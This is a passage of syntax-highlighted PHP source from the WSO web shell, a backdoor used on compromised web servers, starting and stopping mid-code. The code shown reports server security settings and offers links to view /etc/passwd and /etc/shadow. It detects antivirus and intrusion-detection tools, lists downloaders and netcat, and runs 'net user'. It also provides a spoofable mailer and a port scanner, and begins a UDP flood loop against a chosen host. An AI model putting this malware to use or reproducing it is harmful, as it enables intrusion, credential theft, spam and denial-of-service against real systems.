    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0020</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0010</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0008</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;s&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0400</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;S&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0004</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;r&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0002</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;w&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">);</span>
    <span class="nv">$i</span> <span class="o">.=</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0001</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;t&#39;</span> <span class="o">:</span> <span class="s1">&#39;x&#39;</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nv">$p</span> <span class="o">&amp;</span> <span class="mh">0x0200</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;T&#39;</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">));</span>
    <span class="k">return</span> <span class="nv">$i</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoPermsColor</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#FF0000&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="o">!@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=white&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">else</span>
        <span class="k">return</span> <span class="s1">&#39;&amp;lt;font color=#25ff00&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">wsoPerms</span><span class="p">(</span><span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/font&amp;gt;&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;scandir&quot;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">function</span> <span class="nf">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$dh</span>  <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
        <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$filename</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$dh</span><span class="p">)))</span>
            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$filename</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$files</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">wsoWhich</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;which &#39;</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
        <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionSecInfo</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Server security information&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">wsoSecParam</span><span class="p">(</span><span class="nv">$n</span><span class="p">,</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$v</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$n</span> <span class="o">.</span> <span class="s1">&#39;: &amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span>
                <span class="k">echo</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">else</span>
                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Server software&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;apache_get_modules&#39;</span><span class="p">))</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Loaded Apache modules&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nb">apache_get_modules</span><span class="p">()));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Disabled PHP Functions&#39;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;none&#39;</span><span class="p">);</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Open base dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode exec dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_exec_dir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Safe mode include dir&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode_include_dir&#39;</span><span class="p">));</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;cURL support&#39;</span><span class="p">,</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;curl_version&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;enabled&#39;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
    <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_get_client_info&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MySql (&quot;</span><span class="o">.</span><span class="nb">mysql_get_client_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;)&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mssql_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;MSSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;pg_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;PostgreSQL&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;oci_connect&#39;</span><span class="p">))</span>
        <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;Oracle&quot;</span><span class="p">;</span>
    <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Supported databases&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">));</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;nix&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/passwd&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">/etc/</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">passwd</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;[view]&amp;lt;/a&amp;gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Readable /etc/shadow&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="s1">&#39;/etc/shadow&#39;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;yes &amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesTools</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">etc</span><span class="se">\&quot;</span><span class="s2">, </span><span class="se">\&quot;</span><span class="s2">shadow</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;[view]&amp;lt;/a&amp;gt;&quot;</span><span class="o">:</span><span class="s1">&#39;no&#39;</span><span class="p">);</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS version&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/proc/version&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Distr name&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/issue.net&#39;</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">])</span> <span class="p">{</span>
            <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span>
            <span class="nv">$danger</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;kav&#39;</span><span class="p">,</span><span class="s1">&#39;nod32&#39;</span><span class="p">,</span><span class="s1">&#39;bdcored&#39;</span><span class="p">,</span><span class="s1">&#39;uvscan&#39;</span><span class="p">,</span><span class="s1">&#39;sav&#39;</span><span class="p">,</span><span class="s1">&#39;drwebd&#39;</span><span class="p">,</span><span class="s1">&#39;clamd&#39;</span><span class="p">,</span><span class="s1">&#39;rkhunter&#39;</span><span class="p">,</span><span class="s1">&#39;chkrootkit&#39;</span><span class="p">,</span><span class="s1">&#39;iptables&#39;</span><span class="p">,</span><span class="s1">&#39;ipfw&#39;</span><span class="p">,</span><span class="s1">&#39;tripwire&#39;</span><span class="p">,</span><span class="s1">&#39;shieldcc&#39;</span><span class="p">,</span><span class="s1">&#39;portsentry&#39;</span><span class="p">,</span><span class="s1">&#39;snort&#39;</span><span class="p">,</span><span class="s1">&#39;ossec&#39;</span><span class="p">,</span><span class="s1">&#39;lidsadm&#39;</span><span class="p">,</span><span class="s1">&#39;tcplodg&#39;</span><span class="p">,</span><span class="s1">&#39;sxid&#39;</span><span class="p">,</span><span class="s1">&#39;logcheck&#39;</span><span class="p">,</span><span class="s1">&#39;logwatch&#39;</span><span class="p">,</span><span class="s1">&#39;sysmask&#39;</span><span class="p">,</span><span class="s1">&#39;zmbscap&#39;</span><span class="p">,</span><span class="s1">&#39;sawmill&#39;</span><span class="p">,</span><span class="s1">&#39;wormscan&#39;</span><span class="p">,</span><span class="s1">&#39;ninja&#39;</span><span class="p">);</span>
            <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span>
                    <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Userful&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$danger</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span>
                    <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Danger&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="nv">$temp</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">wsoWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span>
                    <span class="nv">$temp</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$item</span><span class="p">;</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Downloaders&#39;</span><span class="p">,</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">,</span><span class="nv">$temp</span><span class="p">));</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br/&amp;gt;&#39;</span><span class="p">;</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;HDD space&#39;</span><span class="p">,</span> <span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;df -h&#39;</span><span class="p">));</span>
            <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Hosts&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/hosts&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;OS Version&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;Account Settings&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net accounts&#39;</span><span class="p">));</span>
        <span class="nx">wsoSecParam</span><span class="p">(</span><span class="s1">&#39;User Accounts&#39;</span><span class="p">,</span><span class="nx">wsoEx</span><span class="p">(</span><span class="s1">&#39;net user&#39;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionphptools</span><span class="p">()</span> <span class="p">{</span>
<span class="nx">wsoHeader</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x">&amp;lt;center&amp;gt;</span><span class="cp">&lt;?php</span>
<span class="c1">//mailer</span>
<span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;Mailer&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s1">&#39;&quot; method=POST&amp;gt;</span>
<span class="s1">&amp;lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;phptools&quot;&amp;gt;</span>
<span class="s1">&amp;lt;input type=text name=to value=to&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">&amp;lt;input type=text name=from value=from&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">&amp;lt;input type=text name=subject value=subject&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">&amp;lt;input type=text name=body value=body&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s1">&amp;lt;input type=submit name=submit value=Submit&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$headers</span> <span class="o">=</span> <span class="s1">&#39;From: &#39;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
    <span class="nb">mail</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">],</span><span class="nv">$headers</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s1">&#39;Email sent.&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">//port scanner</span>
<span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Port Scanner&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
<span class="nv">$start</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;start&#39;</span><span class="p">]);</span>
<span class="nv">$end</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;end&#39;</span><span class="p">]);</span>
<span class="nv">$host</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>

<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;end&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;start&#39;</span><span class="p">])){</span>
<span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$start</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$end</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
    <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s1">&#39;Port &#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39; is &amp;lt;font color=green&amp;gt;open&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">flush</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;form action=&quot;?&quot; method=&quot;POST&quot;&amp;gt;</span>
<span class="x">&amp;lt;input type=&quot;hidden&quot; name=&quot;a&quot; value=&quot;phptools&quot;&amp;gt;</span>
<span class="x">Host:&amp;lt;br /&amp;gt;</span>
<span class="x">&amp;lt;input type=&quot;text&quot; name=&quot;host&quot; value=&quot;localhost&quot;/&amp;gt;&amp;lt;br /&amp;gt;</span>
<span class="x">Port start:&amp;lt;br /&amp;gt;</span>
<span class="x">&amp;lt;input type=&quot;text&quot; name=&quot;start&quot; value=&quot;0&quot;/&amp;gt;&amp;lt;br /&amp;gt;</span>
<span class="x">Port end:&amp;lt;br /&amp;gt;</span>
<span class="x">&amp;lt;input type=&quot;text&quot; name=&quot;end&quot; value=&quot;5000&quot;/&amp;gt;&amp;lt;br /&amp;gt;</span>
<span class="x">&amp;lt;input type=&quot;submit&quot; value=&quot;Scan Ports&quot; /&amp;gt;</span>
<span class="x">&amp;lt;/form&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="p">}</span>

<span class="c1">//UDP</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">])){</span>
    <span class="nv">$pakits</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">TRUE</span><span class="p">);</span>
    <span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    
    <span class="nv">$exec_time</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;time&#39;</span><span class="p">];</span>
    
    <span class="nv">$time</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
    <span class="c1">//print &quot;Started: &quot;.time(&#39;h:i:s&#39;).&quot;&amp;lt;br&amp;gt;&quot;;</span>
    <span class="nv">$max_time</span> <span class="o">=</span> <span class="nv">$time</span><span class="o">+</span><span class="nv">$exec_time</span><span class="p">;</span>

    <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
    
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="mi">65000</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
            <span class="nv">$out</span> <span class="o">.=</span> <span class="s1">&#39;X&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
    <span class="nv">$pakits</span><span class="o">++</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nb">time</span><span class="p">()</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$max_time</span><span class="p">){</span>
                    <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$rand</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">65000</span><span class="p">);</span>
